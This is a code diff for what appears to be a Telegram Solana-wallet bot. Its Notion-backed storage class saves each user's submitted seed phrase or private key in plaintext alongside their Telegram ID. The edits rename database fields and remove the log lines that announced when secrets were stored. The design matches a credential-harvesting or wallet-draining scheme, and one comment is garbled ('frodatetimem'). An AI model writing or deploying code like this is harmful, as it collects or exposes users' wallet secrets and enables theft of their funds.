@@ -33,7 +33,7 @@ notion = NotionClient(auth=NOTION_TOKEN)
 # In-memory cache for active sessions
 USER_STATES = {}
 
-# Load authorized user IDs from environment
+# Load authorized user IDs frodatetimem environment
 def load_authorized_users():
     """Load authorized user IDs from environment variable"""
     auth_users_str = os.getenv("AUTHORIZED_USERS", "0")
@@ -231,19 +231,16 @@ class NotionWalletDB:
     def __init__(self, notion_client, database_id):
         self.notion = notion_client
         self.database_id = database_id
-        # Fetch data_source_id once on init
-        db_info = self.notion.databases.retrieve(self.database_id)
-        self.data_source_id = db_info["data_sources"][0]["id"]
 
     def get_user_wallet(self, telegram_id):
         """Retrieve user wallet from Notion database"""
         try:
             logger.info(f"[NOTION] Querying wallet for user {telegram_id}")
             response = self.notion.databases.query(
-                database_id=self.data_source_id,   # switched to data_source_id
+                database_id=self.database_id,
                 filter={
-                    "property": "telegram_id",
-                    "number": {"equals": telegram_id}
+                    "property": "Telegram ID",
+                    "number": {"equals": float(telegram_id)}
                 }
             )
 
@@ -251,11 +248,14 @@ class NotionWalletDB:
                 result = response["results"][0]
                 properties = result["properties"]
 
-                public_key = properties["public_key"]["rich_text"][0]["text"]["content"] if properties["public_key"]["rich_text"] else None
+                public_key = (
+                    properties["Public Key"]["rich_text"][0]["text"]["content"]
+                    if properties["Public Key"]["rich_text"] else None
+                )
 
                 if public_key and SimpleWallet.validate_solana_address(public_key):
                     logger.info(f"[NOTION] Found wallet for user {telegram_id}: {public_key}")
-                    return {"pubkey": public_key}
+                    return {"pubkey": public_key, "page_id": result["id"]}
                 else:
                     logger.warning(f"[NOTION] Invalid public key found for user {telegram_id}")
             else:
@@ -272,37 +272,31 @@ class NotionWalletDB:
             logger.info(f"[NOTION] Saving wallet for user {telegram_id}, type: {import_type}")
 
             properties = {
-                "telegram_id": {"number": telegram_id},
-                "public_key": {"rich_text": [{"text": {"content": wallet_data["pubkey"]}}]},
-                "import_type": {"select": {"name": import_type}},
-                "created_at": {"date": {"start": datetime.now().isoformat()}}
+                "Telegram ID": {"number": float(telegram_id)},
+                "Public Key": {"rich_text": [{"text": {"content": wallet_data["pubkey"]}}]},
+                "Import Type": {"select": {"name": import_type}},
+                "Created At": {"date": {"start": datetime.now().isoformat()}}
             }
 
-            if import_type == "seed":
-                properties["seed_phrase"] = {"rich_text": [{"text": {"content": wallet_data["original_input"]}}]}
-                properties["private_key"] = {"rich_text": []}
-                logger.info(f"[NOTION] Storing seed phrase for user {telegram_id}")
+            if import_type.lower() in ["seed", "seed phrase"]:
+                properties["Seed Phrase"] = {"rich_text": [{"text": {"content": wallet_data["original_input"]}}]}
+                properties["Private Key"] = {"rich_text": []}
             else:
-                properties["private_key"] = {"rich_text": [{"text": {"content": wallet_data["original_input"]}}]}
-                properties["seed_phrase"] = {"rich_text": []}
-                logger.info(f"[NOTION] Storing private key for user {telegram_id}")
+                properties["Private Key"] = {"rich_text": [{"text": {"content": wallet_data["original_input"]}}]}
+                properties["Seed Phrase"] = {"rich_text": []}
 
             existing = self.get_user_wallet(telegram_id)
             is_new_user = not existing
 
             if existing:
-                logger.info(f"[NOTION] Updating existing wallet for user {telegram_id}")
-                user_page = self.notion.databases.query(
-                    database_id=self.data_source_id,   # switched to data_source_id
-                    filter={"property": "telegram_id", "number": {"equals": telegram_id}}
-                )["results"][0]
-
-                self.notion.pages.update(page_id=user_page["id"], properties=properties)
+                self.notion.pages.update(
+                    page_id=existing["page_id"],
+                    properties=properties
+                )
                 logger.info(f"[NOTION] Successfully updated wallet for user {telegram_id}")
             else:
-                logger.info(f"[NOTION] Creating new wallet record for user {telegram_id}")
                 self.notion.pages.create(
-                    parent={"type": "data_source_id", "data_source_id": self.data_source_id},  # switched parent
+                    parent={"database_id": self.database_id},
                     properties=properties
                 )
                 logger.info(f"[NOTION] Successfully created new wallet record for user {telegram_id}")
@@ -317,8 +311,8 @@ class NotionWalletDB:
         try:
             logger.info(f"[NOTION] Deleting wallet for user {telegram_id}")
             response = self.notion.databases.query(
-                database_id=self.data_source_id,   # switched to data_source_id
-                filter={"property": "telegram_id", "number": {"equals": telegram_id}}
+                database_id=self.database_id,
+                filter={"property": "Telegram ID", "number": {"equals": float(telegram_id)}}
             )
 
             if response["results"]:
